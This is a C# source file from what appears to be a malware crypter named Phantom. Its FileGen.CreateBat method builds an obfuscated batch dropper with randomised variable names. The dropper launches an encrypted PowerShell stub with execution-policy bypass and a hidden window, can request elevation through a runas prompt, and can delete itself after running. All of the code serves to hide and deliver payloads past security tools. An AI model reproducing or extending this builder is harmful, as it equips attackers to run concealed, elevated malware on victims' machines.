using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Phantom
{
    internal class FileGen
    {
        // Method to create batch file content
        internal static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, bool runas, PhantomMain.FileType fileType, Random rng)
        {
            // Generate a random variable name
            string RandomSetVarName = Utils.RandomString(20, rng);

            // Generate PowerShell command using CreatePS method from StubGen class
            string command = StubGen.CreatePS(key, iv, mode, rng);
            StringBuilder output = new StringBuilder();

            // Start building the batch file content
            output.AppendLine(@"@echo off");

            // Generate random variable names
            string randomvarstr_1 = Utils.RandomString(20, rng);
            string randomvarstr_2 = Utils.RandomString(20, rng);
            // Add lines to set a random variable
            output.AppendLine(@"%!%s%!%e%!%t%!%l%!%o%!%c%!%a%!%l%!% %!%e%!%n%!%a%!%b%!%l%!%e%!%d%!%e%!%l%!%a%!%y%!%e%!%d%!%e%!%x%!%p%!%a%!%n%!%s%!%i%!%o%!%n%!%".Replace(@"!", Utils.RandomString(20, rng)));
            output.AppendLine(@"set ""x1=s""".Replace(@"x1", randomvarstr_1));
            output.AppendLine(@"set ""x2=t""".Replace(@"x2", randomvarstr_2));
            output.AppendLine(@"set ""x3=!x1!e!x2!""".Replace(@"x1", randomvarstr_1).Replace(@"x2", randomvarstr_2).Replace(@"x3", RandomSetVarName));

            // If 'runas' flag is set, add code to execute the batch file with elevated privileges
            if (runas)
            {
                // Code to execute the batch file with elevated privileges
                string runascode = @"if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )" + Environment.NewLine + @"cd /d %1";
                // Obfuscate the 'runascode'
                var runasobf = Obfuscator.GenCodeBat(runascode, rng, RandomSetVarName, 3);
                var netfileobf = Obfuscator.GenCodeBat(@"net file > nul 2>&1", rng, RandomSetVarName, 3);
                // Add obfuscated 'runascode' and 'net file' command to the batch file content
                output.AppendLine(netfileobf.Item1 + Environment.NewLine + netfileobf.Item2);
                output.AppendLine(runasobf.Item1 + Environment.NewLine + runasobf.Item2);
            }

            // Prepare command for execution, optionally hiding the window
            string commandstart = $"-noprofile {(hidden ? @"-windowstyle hidden" : string.Empty)} -ep bypass -command ";
            // Obfuscate the PowerShell command
            var obfuscated3 = Obfuscator.GenCodeBat(commandstart + command, rng, RandomSetVarName, 3);
            output.AppendLine(obfuscated3.Item1);
            string powershellPath = @"";
            if (fileType == PhantomMain.FileType.NET64)
            {
                powershellPath = @"%systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            }
            else if (fileType == PhantomMain.FileType.NET86)
            {
                powershellPath = @"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
            }
            else if (fileType == PhantomMain.FileType.x64)
            {
                powershellPath = @"%systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            }
            else if (fileType == PhantomMain.FileType.x86)
            {
                powershellPath = @"%systemdrive%\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";
            }
            var powershellcallobf = Obfuscator.GenCodeBat(@"""" + powershellPath + @""" ", rng, RandomSetVarName, 3);
            output.AppendLine(powershellcallobf.Item1 + Environment.NewLine + powershellcallobf.Item2 + obfuscated3.Item2);

            // If 'selfdelete' flag is set, add code to delete the batch file after execution
            if (selfdelete)
            {
                // Code to delete the batch file after execution
                var meltobf = Obfuscator.GenCodeBat(@"(goto) 2>nul & del ""%~f0""", rng, RandomSetVarName, 3);
                output.AppendLine(meltobf.Item1 + Environment.NewLine + meltobf.Item2);
            }

            // Add exit command to terminate the batch file
            var exitobf = Obfuscator.GenCodeBat(@"exit /b", rng, RandomSetVarName, 3);
            output.Append(exitobf.Item1 + Environment.NewLine + exitobf.Item2);

            // Return the generated batch file content as a string
            return output.ToString();
        }
    }
}
